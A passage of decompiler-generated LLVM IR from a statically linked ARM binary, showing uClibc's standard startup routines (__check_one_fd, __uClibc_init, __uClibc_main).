  call void @__pseudo_cond_branch(i1 %v2_15b44, i32 %v4_15b38)
  %v2_15b48 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15b48, i32* %r4.global-to-local, align 4
  %v1_15b4c = load i32, i32* @r0, align 4
  ret i32 %v1_15b4c

; uselistorder directives
  uselistorder i32 %v1_15b18, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_15b64 = load i32, i32* @r4, align 4
  %v6_15b64 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_15b78 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_15b80 = icmp eq i32 %v2_15b78, -1
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r3, align 4
  br i1 %v3_15b80, label %dec_label_pc_15b8c, label %dec_label_pc_15ba4

dec_label_pc_15b8c:                               ; preds = %entry
  %v0_15b90 = load i32, i32* @r5, align 4
  %v2_15b98 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 -33916), i32 %v0_15b90)
  %v1_15b9c = load i32, i32* @r4, align 4
  %v1_15ba0 = icmp ne i32 %v2_15b98, %v1_15b9c
  call void @__pseudo_cond_branch(i1 %v1_15ba0, i32 ptrtoint (i32* @global_var_146d8.676 to i32))
  br label %dec_label_pc_15ba4

dec_label_pc_15ba4:                               ; preds = %entry, %dec_label_pc_15b8c
  %v1_15bac = phi i32 [ %v2_15b78, %entry ], [ %v2_15b98, %dec_label_pc_15b8c ]
  store i32 %v3_15b64, i32* @r4, align 4
  store i32 %v6_15b64, i32* @r5, align 4
  ret i32 %v1_15bac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_15ba4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15bb8 = load i32, i32* @r4, align 4
  store i32 %v3_15bb8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r4.global-to-local, align 4
  %v4_15bc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 148) to i32*), align 4
  %v1_15bcc = inttoptr i32 %v4_15bc8 to i32*
  %v2_15bcc = load i32, i32* %v1_15bcc, align 4
  %v2_15bd0 = icmp eq i32 %v2_15bcc, 0
  br i1 %v2_15bd0, label %dec_label_pc_15bd8, label %dec_label_pc_15bfc

dec_label_pc_15bd8:                               ; preds = %entry
  store i32 4096, i32* %v1_15bcc, align 4
  %v0_15be0 = call i32 @__pthread_initialize_minimal()
  %v0_15be8 = load i32, i32* %r4.global-to-local, align 4
  %v2_15be8 = add i32 %v0_15be8, -49140
  %v2_15bf0 = icmp eq i32 %v2_15be8, 0
  br i1 %v2_15bf0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_15bd8
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_15bd8, %bb
  %v2_15bf8 = xor i1 %v2_15bf0, true
  call void @__pseudo_cond_branch(i1 %v2_15bf8, i32 %v2_15be8)
  %v2_15bfc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15bfc

dec_label_pc_15bfc:                               ; preds = %entry, %bb4
  %v2_15bfc = phi i32 [ %v2_15bfc.pre, %bb4 ], [ %v3_15bb8, %entry ]
  %.0 = phi i32 [ %v0_15be0, %bb4 ], [ undef, %entry ]
  store i32 %v2_15bfc, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15bfc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 55112, i32* %r4.global-to-local, align 4
  %v1_15c1c = add i32 %tmp, 4
  store i32 %v1_15c1c, i32* %ip.global-to-local, align 4
  %v2_15c20 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r4.global-to-local, align 4
  %v3_15c2c = mul i32 %arg2, 4
  store i32 %v3_15c2c, i32* @r7, align 4
  %v4_15c34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 24) to i32*), align 4
  store i32 %v4_15c34, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_15c3c = add i32 %v1_15c1c, %v3_15c2c
  store i32 %v2_15c3c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %stack_var_-416, align 4
  %v4_15c44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 56) to i32*), align 4
  store i32 %v4_15c44, i32* %r4.global-to-local, align 4
  %v3_15c48 = icmp uge i32 %v2_15c3c, %v2_15c20
  store i1 %v3_15c48, i1* %cpsr_c.global-to-local, align 1
  %v9_15c48 = icmp eq i32 %v2_15c3c, %v2_15c20
  store i1 %v9_15c48, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_15c50 = inttoptr i32 %v4_15c44 to i32*
  store i32 %v2_15c3c, i32* %v2_15c50, align 4
  br i1 %v9_15c48, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_15c58 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c58 = load i32, i32* %r1.global-to-local, align 4
  %v2_15c58 = inttoptr i32 %v1_15c58 to i32*
  store i32 %v0_15c58, i32* %v2_15c58, align 4
  %v2_15c5c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15c5c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2012, i32* %r2.global-to-local, align 4
  %v0_15c68 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_15c68, i32* @r6, align 4
  br i1 %v9_15c48, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_15c7053 = add i32 %v2_15c5c, 2012
  %v4_15c7054 = inttoptr i32 %v3_15c7053 to i32*
  store i32 %arg6, i32* %v4_15c7054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_15c6c = load i32, i32* %ip.global-to-local, align 4
  %v2_15c6c = load i32, i32* @r7, align 4
  %v3_15c6c = add i32 %v2_15c6c, %v1_15c6c
  store i32 %v3_15c6c, i32* %r3.global-to-local, align 4
  %v3_15c7050 = add i32 %v2_15c5c, 2012
  %v4_15c7051 = inttoptr i32 %v3_15c7050 to i32*
  store i32 %arg6, i32* %v4_15c7051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_15c7c = load i32, i32* %r3.global-to-local, align 4
  %v2_15c7c = load i32, i32* %r4.global-to-local, align 4
  %v3_15c7c = inttoptr i32 %v2_15c7c to i32*
  store i32 %v1_15c7c, i32* %v3_15c7c, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_15c80 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_15c80, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_15c88 = bitcast i32* %stack_var_-120 to i8*
  %v4_15c88 = call i32 @__GI_memset(i8* %v3_15c88, i32 0, i32 120)
  store i32 %v4_15c88, i32* %r0.global-to-local, align 4
  %v0_15c8c = load i32, i32* %r4.global-to-local, align 4
  %v1_15c8c = inttoptr i32 %v0_15c8c to i32*
  %v2_15c8c = load i32, i32* %v1_15c8c, align 4
  br label %dec_label_pc_15c98

dec_label_pc_15c98:                               ; preds = %dec_label_pc_15c98, %bb77
  %storemerge = phi i32 [ %v2_15c8c, %bb77 ], [ %v1_15ca4, %dec_label_pc_15c98 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_15c98 = inttoptr i32 %storemerge to i32*
  %v2_15c98 = load i32, i32* %v1_15c98, align 4
  store i32 %v2_15c98, i32* %r3.global-to-local, align 4
  %v2_15c9c = icmp eq i32 %v2_15c98, 0
  %v1_15ca4 = add i32 %storemerge, 4
  br i1 %v2_15c9c, label %dec_label_pc_15ca4, label %dec_label_pc_15c98

dec_label_pc_15ca4:                               ; preds = %dec_label_pc_15c98
  store i32 %v1_15ca4, i32* @r4, align 4
  store i32 %v2_15c80, i32* @r5, align 4
  %v1_15cc830 = inttoptr i32 %v1_15ca4 to i32*
  %v2_15cc831 = load i32, i32* %v1_15cc830, align 4
  store i32 %v2_15cc831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ccc33 = icmp eq i32 %v2_15cc831, 0
  store i1 %v2_15ccc33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ccc33, label %dec_label_pc_15cd4, label %dec_label_pc_15cb0

dec_label_pc_15cb0:                               ; preds = %dec_label_pc_15ca4, %dec_label_pc_15cc8
  %v4_15cb8 = phi i32 [ %v1_15cc4, %dec_label_pc_15cc8 ], [ %v1_15ca4, %dec_label_pc_15ca4 ]
  %v5_15cb4 = phi i32 [ %v2_15cc8, %dec_label_pc_15cc8 ], [ %v2_15cc831, %dec_label_pc_15ca4 ]
  %v2_15cb0 = icmp ugt i32 %v5_15cb4, 13
  store i1 %v2_15cb0, i1* %cpsr_c.global-to-local, align 1
  %v7_15cb0 = icmp eq i32 %v5_15cb4, 14
  store i1 %v7_15cb0, i1* %cpsr_z.global-to-local, align 1
  %v2_15cb4 = xor i1 %v2_15cb0, true
  %v3_15cb4 = or i1 %v7_15cb0, %v2_15cb4
  br i1 %v3_15cb4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_15cb0
  %v4_15cb4 = load i32, i32* @r5, align 4
  %v6_15cb4 = and i32 %v5_15cb4, 536870912
  %v7_15cb4 = icmp ne i32 %v6_15cb4, 0
  store i1 %v7_15cb4, i1* %cpsr_c.global-to-local, align 1
  %v8_15cb4 = mul i32 %v5_15cb4, 8
  %v9_15cb4 = add i32 %v4_15cb4, %v8_15cb4
  store i32 %v9_15cb4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_15cb0, %bb78
  %v1_15cc0 = phi i1 [ %v2_15cb0, %dec_label_pc_15cb0 ], [ %v7_15cb4, %bb78 ]
  %v2_15cb8 = xor i1 %v1_15cc0, true
  %v3_15cb8 = or i1 %v7_15cb0, %v2_15cb8
  br i1 %v3_15cb8, label %bb80, label %dec_label_pc_15cc8

bb80:                                             ; preds = %bb79
  store i32 %v4_15cb8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cc8

dec_label_pc_15cc8:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_15cb8, i32 ptrtoint (i32* @global_var_12a90.684 to i32))
  %v0_15cc4 = load i32, i32* @r4, align 4
  %v1_15cc4 = add i32 %v0_15cc4, 8
  store i32 %v1_15cc4, i32* @r4, align 4
  %v1_15cc8 = inttoptr i32 %v1_15cc4 to i32*
  %v2_15cc8 = load i32, i32* %v1_15cc8, align 4
  store i32 %v2_15cc8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ccc = icmp eq i32 %v2_15cc8, 0
  store i1 %v2_15ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ccc, label %dec_label_pc_15cd4, label %dec_label_pc_15cb0

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15cc8, %dec_label_pc_15ca4
  store i32 %v2_15c80, i32* %r0.global-to-local, align 4
  %v1_15cd8 = call i32 @_dl_aux_init(i32 %v2_15c80)
  store i32 %v1_15cd8, i32* %r0.global-to-local, align 4
  %v1_15cdc = call i32 @__GI___uClibc_init(i32 %v1_15cd8)
  store i32 %v1_15cdc, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_15ce4 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15ce4, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_15cec = add i32 %v2_15ce4, 148
  %v3_15cec = inttoptr i32 %v2_15cec to i32*
  %v4_15cec = load i32, i32* %v3_15cec, align 4
  store i32 %v4_15cec, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15cf4 = icmp eq i32 %tmp66, 0
  store i1 %v2_15cf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cf4, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_15cd4
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_15cd4, %bb81
  %v0_15d00 = phi i32 [ %tmp66, %dec_label_pc_15cd4 ], [ 4096, %bb81 ]
  %v3_15cfc = icmp eq i32 %tmp65, -1
  store i1 %v3_15cfc, i1* %cpsr_c.global-to-local, align 1
  %v8_15cfc = icmp eq i32 %tmp65, -1
  store i1 %v8_15cfc, i1* %cpsr_z.global-to-local, align 1
  %v2_15d00 = inttoptr i32 %v4_15cec to i32*
  store i32 %v0_15d00, i32* %v2_15d00, align 4
  br i1 %v3_15cfc, label %dec_label_pc_15d08, label %dec_label_pc_15d30

dec_label_pc_15d08:                               ; preds = %bb82
  %v0_15d08 = call i32 @getuid()
  store i32 %v0_15d08, i32* @r0, align 4
  store i32 %v0_15d08, i32* %r4.global-to-local, align 4
  %v0_15d10 = call i32 @geteuid()
  store i32 %v0_15d10, i32* @r0, align 4
  %v3_15d14 = icmp uge i32 %v0_15d08, %v0_15d10
  store i1 %v3_15d14, i1* %cpsr_c.global-to-local, align 1
  %v9_15d14 = icmp eq i32 %v0_15d08, %v0_15d10
  store i1 %v9_15d14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d14, label %dec_label_pc_15d1c, label %dec_label_pc_15d58

dec_label_pc_15d1c:                               ; preds = %dec_label_pc_15d08
  %v1_15d1c = call i32 @getgid(i32 %v0_15d10)
  store i32 %v1_15d1c, i32* @r0, align 4
  store i32 %v1_15d1c, i32* %r4.global-to-local, align 4
  %v0_15d24 = call i32 @getegid()
  store i32 %v0_15d24, i32* %r0.global-to-local, align 4
  %v3_15d28 = icmp uge i32 %v1_15d1c, %v0_15d24
  store i1 %v3_15d28, i1* %cpsr_c.global-to-local, align 1
  %v9_15d28 = icmp eq i32 %v1_15d1c, %v0_15d24
  store i1 %v9_15d28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d28, label %dec_label_pc_15d30, label %dec_label_pc_15d58

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d1c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_15cfc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_15cfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15cfc, label %dec_label_pc_15d80, label %dec_label_pc_15d3c

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d30
  store i32 %tmp64, i32* @r3, align 4
  %v3_15d40 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_15d40, i1* %cpsr_c.global-to-local, align 1
  %v9_15d40 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_15d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d40, label %dec_label_pc_15d48, label %dec_label_pc_15d58

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15d3c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_15d50 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_15d50, i1* %cpsr_c.global-to-local, align 1
  %v9_15d50 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_15d50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d50, label %dec_label_pc_15d80, label %dec_label_pc_15d58

dec_label_pc_15d58:                               ; preds = %dec_label_pc_15d3c, %dec_label_pc_15d1c, %dec_label_pc_15d08, %dec_label_pc_15d48
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_15d64 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_15d6c = load i32, i32* @r4, align 4
  store i32 %v0_15d6c, i32* %r1.global-to-local, align 4
  %v2_15d70 = call i32 @__check_one_fd(i32 1, i32 %v0_15d6c)
  %v0_15d74 = load i32, i32* @r4, align 4
  store i32 %v0_15d74, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_15d7c = call i32 @__check_one_fd(i32 2, i32 %v0_15d74)
  store i32 %v2_15d7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d80

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15d48, %dec_label_pc_15d30, %dec_label_pc_15d58
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_15d88 = load i32, i32* %arg3, align 4
  store i32 %v2_15d88, i32* %r2.global-to-local, align 4
  %v2_15d8c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15d8c, i32* %r1.global-to-local, align 4
  %v3_15d90 = add i32 %v2_15d8c, 260
  %v4_15d90 = inttoptr i32 %v3_15d90 to i32*
  store i32 %v2_15d88, i32* %v4_15d90, align 4
  %v0_15d94 = load i32, i32* %r0.global-to-local, align 4
  %v1_15d94 = inttoptr i32 %v0_15d94 to i32*
  %v2_15d94 = load i32, i32* %v1_15d94, align 4
  store i32 %v2_15d94, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d98 = icmp eq i32 %v2_15d94, 0
  store i1 %v2_15d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d98, label %bb84, label %dec_label_pc_15da0

dec_label_pc_15da0:                               ; preds = %dec_label_pc_15d80
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_15da4 = load i32, i32* %r1.global-to-local, align 4
  %v2_15da4 = add i32 %v0_15da4, 164
  %v3_15da4 = inttoptr i32 %v2_15da4 to i32*
  %v4_15da4 = load i32, i32* %v3_15da4, align 4
  store i32 %v4_15da4, i32* %r3.global-to-local, align 4
  %v2_15da8 = inttoptr i32 %v4_15da4 to i32*
  store i32 %v2_15d94, i32* %v2_15da8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_15db0 = load i32, i32* %r0.global-to-local, align 4
  %v1_15db0 = inttoptr i32 %v0_15db0 to i32*
  %v2_15db0 = load i32, i32* %v1_15db0, align 4
  store i32 %v2_15db0, i32* %r0.global-to-local, align 4
  %v4_15db4 = call i32 @__GI_strrchr(i32 %v2_15db0, i32 47, i32 %v2_15d88, i32 %v4_15da4)
  store i32 %v4_15db4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_15dbc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15dbc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15dc0 = icmp eq i32 %v4_15db4, 0
  store i1 %v2_15dc0, i1* %cpsr_z.global-to-local, align 1
  %v2_15dc4 = add i32 %v2_15dbc, 96
  %v3_15dc4 = inttoptr i32 %v2_15dc4 to i32*
  %v4_15dc4 = load i32, i32* %v3_15dc4, align 4
  store i32 %v4_15dc4, i32* %r2.global-to-local, align 4
  br i1 %v2_15dc0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_15da0
  %v2_15dcc58 = inttoptr i32 %v4_15dc4 to i32*
  store i32 0, i32* %v2_15dcc58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_15da0
  %v2_15dc8 = add i32 %v4_15db4, 1
  store i32 %v2_15dc8, i32* %r3.global-to-local, align 4
  %v2_15dcc = inttoptr i32 %v4_15dc4 to i32*
  store i32 %v4_15db4, i32* %v2_15dcc, align 4
  %v1_15dd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_15dd0 = load i32, i32* %r2.global-to-local, align 4
  %v3_15dd0 = inttoptr i32 %v2_15dd0 to i32*
  store i32 %v1_15dd0, i32* %v3_15dd0, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_15d80
  %v2_15de0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15de0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_15dec = add i32 %v2_15de0, -12
  store i32 %v2_15dec, i32* %r5.global-to-local, align 4
  store i32 2008, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_15dfc = add i32 %v2_15de0, 2008
  %v4_15dfc = inttoptr i32 %v3_15dfc to i32*
  store i32 %arg5, i32* %v4_15dfc, align 4
  %v0_15e1418 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e1419 = load i32, i32* %r7.global-to-local, align 4
  %v3_15e1421 = icmp uge i32 %v0_15e1418, %v1_15e1419
  store i1 %v3_15e1421, i1* %cpsr_c.global-to-local, align 1
  %v9_15e1427 = icmp eq i32 %v0_15e1418, %v1_15e1419
  store i1 %v9_15e1427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e1421, label %dec_label_pc_15e48.lr.ph, label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %bb84, %dec_label_pc_15e04
  %v1_15e04 = phi i32 [ %v1_15e10, %dec_label_pc_15e04 ], [ %v0_15e1418, %bb84 ]
  %v0_15e04 = load i32, i32* %r5.global-to-local, align 4
  %v2_15e04 = and i32 %v1_15e04, 1073741824
  %v3_15e04 = icmp ne i32 %v2_15e04, 0
  store i1 %v3_15e04, i1* %cpsr_c.global-to-local, align 1
  %v4_15e04 = mul i32 %v1_15e04, 4
  %v5_15e04 = add i32 %v4_15e04, %v0_15e04
  %v6_15e04 = inttoptr i32 %v5_15e04 to i32*
  %v7_15e04 = load i32, i32* %v6_15e04, align 4
  store i32 %v7_15e04, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_15e04)
  %v0_15e10 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e10 = add i32 %v0_15e10, 1
  store i32 %v1_15e10, i32* %r4.global-to-local, align 4
  %v1_15e14 = load i32, i32* %r7.global-to-local, align 4
  %v3_15e14 = icmp uge i32 %v1_15e10, %v1_15e14
  store i1 %v3_15e14, i1* %cpsr_c.global-to-local, align 1
  %v9_15e14 = icmp eq i32 %v1_15e10, %v1_15e14
  store i1 %v9_15e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e14, label %dec_label_pc_15e48.lr.ph, label %dec_label_pc_15e04

dec_label_pc_15e48.lr.ph:                         ; preds = %dec_label_pc_15e04, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e1c = icmp eq i32 %v0_15c68, 0
  store i1 %v2_15e1c, i1* %cpsr_z.global-to-local, align 1
  %v2_15e24 = xor i1 %v2_15e1c, true
  call void @__pseudo_cond_branch(i1 %v2_15e24, i32 %v0_15c68)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_15e30 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_15e3c = add i32 %v2_15e30, -12
  store i32 %v2_15e3c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15e48

dec_label_pc_15e48:                               ; preds = %dec_label_pc_15e48.dec_label_pc_15e48_crit_edge, %dec_label_pc_15e48.lr.ph
  %v1_15e48 = phi i32 [ %v1_15e54, %dec_label_pc_15e48.dec_label_pc_15e48_crit_edge ], [ 0, %dec_label_pc_15e48.lr.ph ]
  %v0_15e48 = phi i32 [ %v0_15e48.pre, %dec_label_pc_15e48.dec_label_pc_15e48_crit_edge ], [ %v2_15e3c, %dec_label_pc_15e48.lr.ph ]
  %v2_15e48 = and i32 %v1_15e48, 1073741824
  %v3_15e48 = icmp ne i32 %v2_15e48, 0
  store i1 %v3_15e48, i1* %cpsr_c.global-to-local, align 1
  %v4_15e48 = mul i32 %v1_15e48, 4
  %v5_15e48 = add i32 %v4_15e48, %v0_15e48
  %v6_15e48 = inttoptr i32 %v5_15e48 to i32*
  %v7_15e48 = load i32, i32* %v6_15e48, align 4
  store i32 %v7_15e48, i32* %ip.global-to-local, align 4
  store i32 89684, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_15e48)
  %v0_15e54 = load i32, i32* @r4, align 4
  %v1_15e54 = add i32 %v0_15e54, 1
  store i32 %v1_15e54, i32* @r4, align 4
  %v1_15e58 = load i32, i32* @r7, align 4
  %v3_15e58 = icmp uge i32 %v1_15e54, %v1_15e58
  store i1 %v3_15e58, i1* %cpsr_c.global-to-local, align 1
  %v9_15e58 = icmp eq i32 %v1_15e54, %v1_15e58
  store i1 %v9_15e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15e58, label %dec_label_pc_15e60, label %dec_label_pc_15e48.dec_label_pc_15e48_crit_edge

dec_label_pc_15e48.dec_label_pc_15e48_crit_edge:  ; preds = %dec_label_pc_15e48
  %v0_15e48.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15e48

dec_label_pc_15e60:                               ; preds = %dec_label_pc_15e48
  %v2_15e64.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15e64.pre, i32* %r0.global-to-local, align 4
  %v2_15e68 = add i32 %v2_15e64.pre, -67900
  store i32 %v2_15e68, i32* %r2.global-to-local, align 4
  store i32 %v2_15e68, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e70 = icmp eq i32 %v2_15e68, 0
  store i1 %v2_15e70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e70, label %dec_label_pc_15e88, label %dec_label_pc_15e78

dec_label_pc_15e78:                               ; preds = %dec_label_pc_15e60
  store i32 89728, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_15e68)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15e84 = load i32, i32* %r0.global-to-local, align 4
  %v2_15e84 = inttoptr i32 %v1_15e84 to i32*
  store i32 0, i32* %v2_15e84, align 4
  %v2_15e8c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_15e88

dec_label_pc_15e88:                               ; preds = %dec_label_pc_15e60, %dec_label_pc_15e78
  %v2_15e8c = phi i32 [ %v2_15e64.pre, %dec_label_pc_15e60 ], [ %v2_15e8c.pre, %dec_label_pc_15e78 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_15e8c, i32* %r1.global-to-local, align 4
  %v2_15e90 = add i32 %v2_15e8c, 128
  %v3_15e90 = inttoptr i32 %v2_15e90 to i32*
  %v4_15e90 = load i32, i32* %v3_15e90, align 4
  store i32 %v4_15e90, i32* %r2.global-to-local, align 4
  store i32 %v4_15e90, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e98 = icmp eq i32 %v4_15e90, 0
  store i1 %v2_15e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e98, label %dec_label_pc_15eb0, label %dec_label_pc_15ea0

dec_label_pc_15ea0:                               ; preds = %dec_label_pc_15e88
  store i32 89768, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15e90)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15eac = load i32, i32* %r0.global-to-local, align 4
  %v2_15eac = inttoptr i32 %v1_15eac to i32*
  store i32 0, i32* %v2_15eac, align 4
  br label %dec_label_pc_15eb0

dec_label_pc_15eb0:                               ; preds = %dec_label_pc_15e88, %dec_label_pc_15ea0
